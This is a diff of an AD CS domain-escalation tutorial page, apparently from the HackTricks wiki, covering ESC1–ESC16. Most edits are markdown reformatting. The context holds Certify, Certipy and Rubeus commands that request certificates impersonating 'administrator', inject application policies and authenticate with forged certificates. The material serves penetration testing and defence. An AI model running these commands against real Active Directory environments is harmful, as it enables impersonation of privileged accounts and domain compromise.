@@ -1,13 +1,12 @@
 # AD CS Domain Escalation
 
-{{#include ../../../banners/hacktricks-training.md}}
-
+\{{#include ../../../banners/hacktricks-training.md\}}
 
 **This is a summary of escalation technique sections of the posts:**
 
-- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
-- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
-- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
+* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
+* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
 
 ## Misconfigured Certificate Templates - ESC1
 
@@ -15,17 +14,16 @@
 
 ### Misconfigured Certificate Templates - ESC1 Explained
 
-- **Enrolment rights are granted to low-privileged users by the Enterprise CA.**
-- **Manager approval is not required.**
-- **No signatures from authorized personnel are needed.**
-- **Security descriptors on certificate templates are overly permissive, allowing low-privileged users to obtain enrolment rights.**
-- **Certificate templates are configured to define EKUs that facilitate authentication:**
-  - Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
-- **The ability for requesters to include a subjectAltName in the Certificate Signing Request (CSR) is allowed by the template:**
-  - The Active Directory (AD) prioritizes the subjectAltName (SAN) in a certificate for identity verification if present. This means that by specifying the SAN in a CSR, a certificate can be requested to impersonate any user (e.g., a domain administrator). Whether a SAN can be specified by the requester is indicated in the certificate template's AD object through the `mspki-certificate-name-flag` property. This property is a bitmask, and the presence of the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag permits the specification of the SAN by the requester.
+* **Enrolment rights are granted to low-privileged users by the Enterprise CA.**
+* **Manager approval is not required.**
+* **No signatures from authorized personnel are needed.**
+* **Security descriptors on certificate templates are overly permissive, allowing low-privileged users to obtain enrolment rights.**
+* **Certificate templates are configured to define EKUs that facilitate authentication:**
+  * Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
+* **The ability for requesters to include a subjectAltName in the Certificate Signing Request (CSR) is allowed by the template:**
+  * The Active Directory (AD) prioritizes the subjectAltName (SAN) in a certificate for identity verification if present. This means that by specifying the SAN in a CSR, a certificate can be requested to impersonate any user (e.g., a domain administrator). Whether a SAN can be specified by the requester is indicated in the certificate template's AD object through the `mspki-certificate-name-flag` property. This property is a bitmask, and the presence of the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag permits the specification of the SAN by the requester.
 
-> [!CAUTION]
-> The configuration outlined permits low-privileged users to request certificates with any SAN of choice, enabling authentication as any domain principal through Kerberos or SChannel.
+> \[!CAUTION] The configuration outlined permits low-privileged users to request certificates with any SAN of choice, enabling authentication as any domain principal through Kerberos or SChannel.
 
 This feature is sometimes enabled to support the on-the-fly generation of HTTPS or host certificates by products or deployment services, or due to a lack of understanding.
 
@@ -109,19 +107,19 @@ The **“enrollment agent”** enrolls in such a **template** and uses the resul
 
 **Requirements 1:**
 
-- Enrollment rights are granted to low-privileged users by the Enterprise CA.
-- The requirement for manager approval is omitted.
-- No requirement for authorized signatures.
-- The security descriptor of the certificate template is excessively permissive, granting enrollment rights to low-privileged users.
-- The certificate template includes the Certificate Request Agent EKU, enabling the request of other certificate templates on behalf of other principals.
+* Enrollment rights are granted to low-privileged users by the Enterprise CA.
+* The requirement for manager approval is omitted.
+* No requirement for authorized signatures.
+* The security descriptor of the certificate template is excessively permissive, granting enrollment rights to low-privileged users.
+* The certificate template includes the Certificate Request Agent EKU, enabling the request of other certificate templates on behalf of other principals.
 
 **Requirements 2:**
 
-- The Enterprise CA grants enrollment rights to low-privileged users.
-- Manager approval is bypassed.
-- The template's schema version is either 1 or exceeds 2, and it specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
-- An EKU defined in the certificate template permits domain authentication.
-- Restrictions for enrollment agents are not applied on the CA.
+* The Enterprise CA grants enrollment rights to low-privileged users.
+* Manager approval is bypassed.
+* The template's schema version is either 1 or exceeds 2, and it specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
+* An EKU defined in the certificate template permits domain authentication.
+* Restrictions for enrollment agents are not applied on the CA.
 
 ### Abuse
 
@@ -155,11 +153,11 @@ Should an **attacker** possess the requisite **permissions** to **alter** a **te
 
 Notable permissions applicable to certificate templates include:
 
-- **Owner:** Grants implicit control over the object, allowing for the modification of any attributes.
-- **FullControl:** Enables complete authority over the object, including the capability to alter any attributes.
-- **WriteOwner:** Permits the alteration of the object's owner to a principal under the attacker's control.
-- **WriteDacl:** Allows for the adjustment of access controls, potentially granting an attacker FullControl.
-- **WriteProperty:** Authorizes the editing of any object properties.
+* **Owner:** Grants implicit control over the object, allowing for the modification of any attributes.
+* **FullControl:** Enables complete authority over the object, including the capability to alter any attributes.
+* **WriteOwner:** Permits the alteration of the object's owner to a principal under the attacker's control.
+* **WriteDacl:** Allows for the adjustment of access controls, potentially granting an attacker FullControl.
+* **WriteProperty:** Authorizes the editing of any object properties.
 
 ### Abuse
 
@@ -172,7 +170,7 @@ Certify.exe pkiobjects /domain:corp.local /showAdmins
 
 An example of a privesc like the previous one:
 
-<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>
 
 ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.
 
@@ -201,13 +199,13 @@ certipy template -username john@corp.local -password Passw0rd -template ESC4-Tes
 
 The extensive web of interconnected ACL-based relationships, which includes several objects beyond certificate templates and the certificate authority, can impact the security of the entire AD CS system. These objects, which can significantly affect security, encompass:
 
-- The AD computer object of the CA server, which may be compromised through mechanisms like S4U2Self or S4U2Proxy.
-- The RPC/DCOM server of the CA server.
-- Any descendant AD object or container within the specific container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. This path includes, but is not limited to, containers and objects such as the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, and the Enrollment Services Container.
+* The AD computer object of the CA server, which may be compromised through mechanisms like S4U2Self or S4U2Proxy.
+* The RPC/DCOM server of the CA server.
+* Any descendant AD object or container within the specific container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. This path includes, but is not limited to, containers and objects such as the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, and the Enrollment Services Container.
 
 The security of the PKI system can be compromised if a low-privileged attacker manages to gain control over any of these critical components.
 
-## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6
+## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6
 
 ### Explanation
 
@@ -252,8 +250,7 @@ To disable this configuration in your environment, the flag can be removed with:
 certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
 ```
 
-> [!WARNING]
-> Post the May 2022 security updates, newly issued **certificates** will contain a **security extension** that incorporates the **requester's `objectSid` property**. For ESC1, this SID is derived from the specified SAN. However, for **ESC6**, the SID mirrors the **requester's `objectSid`**, not the SAN.\
+> \[!WARNING] Post the May 2022 security updates, newly issued **certificates** will contain a **security extension** that incorporates the **requester's `objectSid` property**. For ESC1, this SID is derived from the specified SAN. However, for **ESC6**, the SID mirrors the **requester's `objectSid`**, not the SAN.\
 > To exploit ESC6, it is essential for the system to be susceptible to ESC10 (Weak Certificate Mappings), which prioritizes the **SAN over the new security extension**.
 
 ## Vulnerable Certificate Authority Access Control - ESC7
@@ -300,16 +297,15 @@ Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
 
 #### Explanation
 
-> [!WARNING]
-> In the **previous attack** **`Manage CA`** permissions were used to **enable** the **EDITF_ATTRIBUTESUBJECTALTNAME2** flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.
+> \[!WARNING] In the **previous attack** **`Manage CA`** permissions were used to **enable** the **EDITF\_ATTRIBUTESUBJECTALTNAME2** flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.
 
 Therefore, another attack is presented here.
 
 Perquisites:
 
-- Only **`ManageCA` permission**
-- **`Manage Certificates`** permission (can be granted from **`ManageCA`**)
-- Certificate template **`SubCA`** must be **enabled** (can be enabled from **`ManageCA`**)
+* Only **`ManageCA` permission**
+* **`Manage Certificates`** permission (can be granted from **`ManageCA`**)
+* Certificate template **`SubCA`** must be **enabled** (can be enabled from **`ManageCA`**)
 
 The technique relies on the fact that users with the `Manage CA` _and_ `Manage Certificates` access right can **issue failed certificate requests**. The **`SubCA`** certificate template is **vulnerable to ESC1**, but **only administrators** can enroll in the template. Thus, a **user** can **request** to enroll in the **`SubCA`** - which will be **denied** - but **then issued by the manager afterwards**.
 
@@ -381,69 +377,63 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 #### Explanation
 
-In addition to the classic ESC7 abuses (enabling EDITF attributes or approving pending requests), **Certify 2.0** revealed a brand-new primitive that only requires the *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) role on the Enterprise CA.
+In addition to the classic ESC7 abuses (enabling EDITF attributes or approving pending requests), **Certify 2.0** revealed a brand-new primitive that only requires the _Manage Certificates_ (a.k.a. **Certificate Manager / Officer**) role on the Enterprise CA.
 
-The `ICertAdmin::SetExtension` RPC method can be executed by any principal holding *Manage Certificates*.  While the method was traditionally used by legitimate CAs to update extensions on **pending** requests, an attacker can abuse it to **append a *non-default* certificate extension** (for example a custom *Certificate Issuance Policy* OID such as `1.1.1.1`) to a request that is waiting for approval.
+The `ICertAdmin::SetExtension` RPC method can be executed by any principal holding _Manage Certificates_. While the method was traditionally used by legitimate CAs to update extensions on **pending** requests, an attacker can abuse it to **append a&#x20;**_**non-default**_**&#x20;certificate extension** (for example a custom _Certificate Issuance Policy_ OID such as `1.1.1.1`) to a request that is waiting for approval.
 
-Because the targeted template does **not define a default value for that extension**, the CA will NOT overwrite the attacker-controlled value when the request is eventually issued.  The resulting certificate therefore contains an attacker-chosen extension that may:
+Because the targeted template does **not define a default value for that extension**, the CA will NOT overwrite the attacker-controlled value when the request is eventually issued. The resulting certificate therefore contains an attacker-chosen extension that may:
 
 * Satisfy Application / Issuance Policy requirements of other vulnerable templates (leading to privilege escalation).
 * Inject additional EKUs or policies that grant the certificate unexpected trust in third-party systems.
 
-In short, *Manage Certificates* – previously considered the “less powerful” half of ESC7 – can now be leveraged for full privilege escalation or long-term persistence, without touching CA configuration or requiring the more restrictive *Manage CA* right.
+In short, _Manage Certificates_ – previously considered the “less powerful” half of ESC7 – can now be leveraged for full privilege escalation or long-term persistence, without touching CA configuration or requiring the more restrictive _Manage CA_ right.
 
 #### Abusing the primitive with Certify 2.0
 
-1. **Submit a certificate request that will remain *pending*.**  This can be forced with a template that requires manager approval:
-   ```powershell
-   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
-   # Take note of the returned Request ID
-   ```
+1.  **Submit a certificate request that will remain&#x20;**_**pending**_**.** This can be forced with a template that requires manager approval:
 
-2. **Append a custom extension to the pending request** using the new `manage-ca` command:
-   ```powershell
-   Certify.exe manage-ca --ca SERVER\\CA-NAME \
-                     --request-id 1337 \
-                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
-   ```
-   *If the template does not already define the *Certificate Issuance Policies* extension, the value above will be preserved after issuance.*
+    ```powershell
+    Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
+    # Take note of the returned Request ID
+    ```
+2.  **Append a custom extension to the pending request** using the new `manage-ca` command:
 
-3. **Issue the request** (if your role also has *Manage Certificates* approval rights) or wait for an operator to approve it.  Once issued, download the certificate:
-   ```powershell
-   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
-   ```
+    ```powershell
+    Certify.exe manage-ca --ca SERVER\\CA-NAME \
+                      --request-id 1337 \
+                      --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
+    ```
 
+    _If the template does not already define the Certificate Issuance Policies extension, the value above will be preserved after issuance._
+3.  **Issue the request** (if your role also has _Manage Certificates_ approval rights) or wait for an operator to approve it. Once issued, download the certificate:
+
+    ```powershell
+    Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
+    ```
 4. The resulting certificate now contains the malicious issuance-policy OID and can be used in subsequent attacks (e.g. ESC13, domain escalation, etc.).
 
-> NOTE:  The same attack can be executed with Certipy ≥ 4.7 through the `ca` command and the `-set-extension` parameter.
+> NOTE: The same attack can be executed with Certipy ≥ 4.7 through the `ca` command and the `-set-extension` parameter.
 
 ## NTLM Relay to AD CS HTTP Endpoints – ESC8
 
 ### Explanation
 
-> [!TIP]
-> In environments where **AD CS is installed**, if a **web enrollment endpoint vulnerable** exists and at least one **certificate template is published** that permits **domain computer enrollment and client authentication** (such as the default **`Machine`** template), it becomes possible for **any computer with the spooler service active to be compromised by an attacker**!
+> \[!TIP] In environments where **AD CS is installed**, if a **web enrollment endpoint vulnerable** exists and at least one **certificate template is published** that permits **domain computer enrollment and client authentication** (such as the default **`Machine`** template), it becomes possible for **any computer with the spooler service active to be compromised by an attacker**!
 
 Several **HTTP-based enrollment methods** are supported by AD CS, made available through additional server roles that administrators may install. These interfaces for HTTP-based certificate enrollment are susceptible to **NTLM relay attacks**. An attacker, from a **compromised machine, can impersonate any AD account that authenticates via inbound NTLM**. While impersonating the victim account, these web interfaces can be accessed by an attacker to **request a client authentication certificate using the `User` or `Machine` certificate templates**.
 
-- The **web enrollment interface** (an older ASP application available at `http://<caserver>/certsrv/`), defaults to HTTP only, which does not offer protection against NTLM relay attacks. Additionally, it explicitly permits only NTLM authentication through its Authorization HTTP header, rendering more secure authentication methods like Kerberos inapplicable.
-- The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, and **Network Device Enrollment Service** (NDES) by default support negotiate authentication via their Authorization HTTP header. Negotiate authentication **supports both** Kerberos and **NTLM**, allowing an attacker to **downgrade to NTLM** authentication during relay attacks. Although these web services enable HTTPS by default, HTTPS alone **does not safeguard against NTLM relay attacks**. Protection from NTLM relay attacks for HTTPS services is only possible when HTTPS is combined with channel binding. Regrettably, AD CS does not activate Extended Protection for Authentication on IIS, which is required for channel binding.
+* The **web enrollment interface** (an older ASP application available at `http://<caserver>/certsrv/`), defaults to HTTP only, which does not offer protection against NTLM relay attacks. Additionally, it explicitly permits only NTLM authentication through its Authorization HTTP header, rendering more secure authentication methods like Kerberos inapplicable.
+* The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, and **Network Device Enrollment Service** (NDES) by default support negotiate authentication via their Authorization HTTP header. Negotiate authentication **supports both** Kerberos and **NTLM**, allowing an attacker to **downgrade to NTLM** authentication during relay attacks. Although these web services enable HTTPS by default, HTTPS alone **does not safeguard against NTLM relay attacks**. Protection from NTLM relay attacks for HTTPS services is only possible when HTTPS is combined with channel binding. Regrettably, AD CS does not activate Extended Protection for Authentication on IIS, which is required for channel binding.
 
 A common **issue** with NTLM relay attacks is the **short duration of NTLM sessions** and the inability of the attacker to interact with services that **require NTLM signing**.
 
 Nevertheless, this limitation is overcome by exploiting an NTLM relay attack to acquire a certificate for the user, as the certificate's validity period dictates the session's duration, and the certificate can be employed with services that **mandate NTLM signing**. For instructions on utilizing a stolen certificate, refer to:
 
-
-{{#ref}}
-account-persistence.md
-{{#endref}}
+\{{#ref\}} account-persistence.md \{{#endref\}}
 
 Another limitation of NTLM relay attacks is that **an attacker-controlled machine must be authenticated to by a victim account**. The attacker could either wait or attempt to **force** this authentication:
 
-
-{{#ref}}
-../printers-spooler-service-abuse.md
-{{#endref}}
+\{{#ref\}} ../printers-spooler-service-abuse.md \{{#endref\}}
 
 ### **Abuse**
 
@@ -453,7 +443,7 @@ Another limitation of NTLM relay attacks is that **an attacker-controlled machin
 Certify.exe cas
 ```
 
-<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
 
 The `msPKI-Enrollment-Servers` property is used by enterprise Certificate Authorities (CAs) to store Certificate Enrollment Service (CES) endpoints. These endpoints can be parsed and listed by utilizing the tool **Certutil.exe**:
 
@@ -461,14 +451,14 @@ The `msPKI-Enrollment-Servers` property is used by enterprise Certificate Author
 certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
 ```
 
-<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 Import-Module PSPKI
 Get-CertificationAuthority | select Name,Enroll* | Format-List *
 ```
 
-<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>
 
 #### Abuse with Certify
 
@@ -514,10 +504,10 @@ The new value **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) for **`msPKI-Enrol
 
 The conditions under which this flag's setting becomes significant include:
 
-- `StrongCertificateBindingEnforcement` is not adjusted to `2` (with the default being `1`), or `CertificateMappingMethods` includes the `UPN` flag.
-- The certificate is marked with the `CT_FLAG_NO_SECURITY_EXTENSION` flag within the `msPKI-Enrollment-Flag` setting.
-- Any client authentication EKU is specified by the certificate.
-- `GenericWrite` permissions are available over any account to compromise another.
+* `StrongCertificateBindingEnforcement` is not adjusted to `2` (with the default being `1`), or `CertificateMappingMethods` includes the `UPN` flag.
+* The certificate is marked with the `CT_FLAG_NO_SECURITY_EXTENSION` flag within the `msPKI-Enrollment-Flag` setting.
+* Any client authentication EKU is specified by the certificate.
+* `GenericWrite` permissions are available over any account to compromise another.
 
 ### Abuse Scenario
 
@@ -563,8 +553,8 @@ certipy auth -pfx adminitrator.pfx -domain corp.local
 
 Two registry key values on the domain controller are referred to by ESC10:
 
-- The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
-- The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.
+* The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
+* The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.
 
 **Case 1**
 
@@ -792,59 +782,66 @@ A "weak" mapping occurs when the string value used within the `altSecurityIdenti
 
 Examples of potentially weak `altSecurityIdentities` mapping strings include:
 
-- Mapping solely by a common Subject Common Name (CN): e.g., `X509:<S>CN=SomeUser`. An attacker might be able to obtain a certificate with this CN from a less secure source.
-- Using overly generic Issuer Distinguished Names (DNs) or Subject DNs without further qualification like a specific serial number or subject key identifier: e.g., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
-- Employing other predictable patterns or non-cryptographic identifiers that an attacker might be able to satisfy in a certificate they can legitimately obtain or forge (if they have compromised a CA or found a vulnerable template like in ESC1).
+* Mapping solely by a common Subject Common Name (CN): e.g., `X509:<S>CN=SomeUser`. An attacker might be able to obtain a certificate with this CN from a less secure source.
+* Using overly generic Issuer Distinguished Names (DNs) or Subject DNs without further qualification like a specific serial number or subject key identifier: e.g., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
+* Employing other predictable patterns or non-cryptographic identifiers that an attacker might be able to satisfy in a certificate they can legitimately obtain or forge (if they have compromised a CA or found a vulnerable template like in ESC1).
 
 The `altSecurityIdentities` attribute supports various formats for mapping, such as:
 
-- `X509:<I>IssuerDN<S>SubjectDN` (maps by full Issuer and Subject DN)
-- `X509:<SKI>SubjectKeyIdentifier` (maps by the certificate's Subject Key Identifier extension value)
-- `X509:<SR>SerialNumberBackedByIssuerDN` (maps by serial number, implicitly qualified by the Issuer DN) - this is not a standard format, usually it's `<I>IssuerDN<SR>SerialNumber`.
-- `X509:<RFC822>EmailAddress` (maps by an RFC822 name, typically an email address, from the SAN)
-- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (maps by a SHA1 hash of the certificate's raw public key - generally strong)
+* `X509:<I>IssuerDN<S>SubjectDN` (maps by full Issuer and Subject DN)
+* `X509:<SKI>SubjectKeyIdentifier` (maps by the certificate's Subject Key Identifier extension value)
+* `X509:<SR>SerialNumberBackedByIssuerDN` (maps by serial number, implicitly qualified by the Issuer DN) - this is not a standard format, usually it's `<I>IssuerDN<SR>SerialNumber`.
+* `X509:<RFC822>EmailAddress` (maps by an RFC822 name, typically an email address, from the SAN)
+* `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (maps by a SHA1 hash of the certificate's raw public key - generally strong)
 
 The security of these mappings depends heavily on the specificity, uniqueness, and cryptographic strength of the chosen certificate identifiers used in the mapping string. Even with strong certificate binding modes enabled on Domain Controllers (which primarily affect implicit mappings based on SAN UPNs/DNS and the SID extension), a poorly configured `altSecurityIdentities` entry can still present a direct path for impersonation if the mapping logic itself is flawed or too permissive.
+
 ### Abuse Scenario
 
 ESC14 targets **explicit certificate mappings** in Active Directory (AD), specifically the `altSecurityIdentities` attribute. If this attribute is set (by design or misconfiguration), attackers can impersonate accounts by presenting certificates that match the mapping.
 
 #### Scenario A: Attacker Can Write to `altSecurityIdentities`
 
- **Precondition**: Attacker has write permissions to the target account’s `altSecurityIdentities` attribute or the permission to grant it in the form of one of the following permissions on the target AD object:  
-- Write property `altSecurityIdentities`  
-- Write property `Public-Information`  
-- Write property (all)  
-- `WriteDACL`  
-- `WriteOwner`*  
-- `GenericWrite`  
-- `GenericAll`  
-- Owner*.
+**Precondition**: Attacker has write permissions to the target account’s `altSecurityIdentities` attribute or the permission to grant it in the form of one of the following permissions on the target AD object:
+
+* Write property `altSecurityIdentities`
+* Write property `Public-Information`
+* Write property (all)
+* `WriteDACL`
+* `WriteOwner`\*
+* `GenericWrite`
+* `GenericAll`
+* Owner\*.
+
 #### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)
 
-- **Precondition**: The target has a weak X509RFC822 mapping in altSecurityIdentities. An attacker can set the victim's mail attribute to match the target's X509RFC822 name, enroll a certificate as the victim, and use it to authenticate as the target.
+* **Precondition**: The target has a weak X509RFC822 mapping in altSecurityIdentities. An attacker can set the victim's mail attribute to match the target's X509RFC822 name, enroll a certificate as the victim, and use it to authenticate as the target.
+
 #### Scenario C: Target Has X509IssuerSubject Mapping
 
-- **Precondition**: The target has a weak X509IssuerSubject explicit mapping in `altSecurityIdentities`.The attacker can set the `cn` or `dNSHostName` attribute on a victim principal to match the subject of the target’s X509IssuerSubject mapping. Then, the attacker can enroll a certificate as the victim, and use this certificate to authenticate as the target.
+* **Precondition**: The target has a weak X509IssuerSubject explicit mapping in `altSecurityIdentities`.The attacker can set the `cn` or `dNSHostName` attribute on a victim principal to match the subject of the target’s X509IssuerSubject mapping. Then, the attacker can enroll a certificate as the victim, and use this certificate to authenticate as the target.
+
 #### Scenario D: Target Has X509SubjectOnly Mapping
 
-- **Precondition**: The target has a weak X509SubjectOnly explicit mapping in `altSecurityIdentities`. The attacker can set the `cn` or `dNSHostName` attribute on a victim principal to match the subject of the target’s X509SubjectOnly mapping. Then, the attacker can enroll a certificate as the victim, and use this certificate to authenticate as the target.
+* **Precondition**: The target has a weak X509SubjectOnly explicit mapping in `altSecurityIdentities`. The attacker can set the `cn` or `dNSHostName` attribute on a victim principal to match the subject of the target’s X509SubjectOnly mapping. Then, the attacker can enroll a certificate as the victim, and use this certificate to authenticate as the target.
+
 ### concrete operations
+
 #### Scenario A
 
-Request a certificate of the certificate template `Machine`
+Request a certificate of the certificate template `Machine`
 
 ```bash
 .\Certify.exe request /ca:<ca> /template:Machine /machine
 ```
 
- Save and convert the certificate
+Save and convert the certificate
 
 ```bash
 certutil -MergePFX .\esc13.pem .\esc13.pfx
 ```
 
- Authenticate (using the certificate)
+Authenticate (using the certificate)
 
 ```bash
 .\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
@@ -864,12 +861,11 @@ For more specific attack methods in various attack scenarios, please refer to th
 
 The description at https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc is remarkably thorough. Below is a quotation of the original text.
 
-Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template
+Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the _**WebServer**_ template
 
 ### Abuse
 
-The following is referenced to [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.
-
+The following is referenced to \[this link]\((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.
 
 Certipy's `find` command can help identify V1 templates that are potentially susceptible to ESC15 if the CA is unpatched.
 
@@ -890,9 +886,9 @@ certipy req \
     -application-policies 'Client Authentication'
 ```
 
-- `-template 'WebServer'`: The vulnerable V1 template with "Enrollee supplies subject".
-- `-application-policies 'Client Authentication'`: Injects the OID `1.3.6.1.5.5.7.3.2` into the Application Policies extension of the CSR.
-- `-upn 'administrator@corp.local'`: Sets the UPN in the SAN for impersonation.
+* `-template 'WebServer'`: The vulnerable V1 template with "Enrollee supplies subject".
+* `-application-policies 'Client Authentication'`: Injects the OID `1.3.6.1.5.5.7.3.2` into the Application Policies extension of the CSR.
+* `-upn 'administrator@corp.local'`: Sets the UPN in the SAN for impersonation.
 
 **Step 2: Authenticate via Schannel (LDAPS) using the obtained certificate.**
 
@@ -912,7 +908,7 @@ certipy req \
     -application-policies 'Certificate Request Agent'
 ```
 
-- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.
+* `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.
 
 **Step 2: Use the "agent" certificate to request a certificate on behalf of a target privileged user.** This is an ESC3-like step, using the certificate from Step 1 as the agent certificate.
 
@@ -934,10 +930,9 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
 
 ### Explanation
 
-**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** refers to the scenario where, if the configuration of AD CS does not enforce the inclusion of the **szOID_NTDS_CA_SECURITY_EXT** extension in all certificates, an attacker can exploit this by:
+**ESC16 (Elevation of Privilege via Missing szOID\_NTDS\_CA\_SECURITY\_EXT Extension)** refers to the scenario where, if the configuration of AD CS does not enforce the inclusion of the **szOID\_NTDS\_CA\_SECURITY\_EXT** extension in all certificates, an attacker can exploit this by:
 
 1. Requesting a certificate **without SID binding**.
-    
 2. Using this certificate **for authentication as any account**, such as impersonating a high-privilege account (e.g., a Domain Administrator).
 
 You can also refer to this article to learn more about the detailed principle:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6
@@ -946,14 +941,13 @@ You can also refer to this article to learn more about the detailed principle:ht
 
 The following is referenced to [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Click to see more detailed usage methods.
 
-To identify whether the Active Directory Certificate Services (AD CS) environment is vulnerable to **ESC16**
+To identify whether the Active Directory Certificate Services (AD CS) environment is vulnerable to **ESC16**
 
 ```bash
 certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
 ```
 
-**Step 1: Read initial UPN of the victim account (Optional - for restoration).  
-
+\*\*Step 1: Read initial UPN of the victim account (Optional - for restoration).
 
 ```bash
 certipy account \
@@ -962,7 +956,7 @@ certipy account \
     read
 ```
 
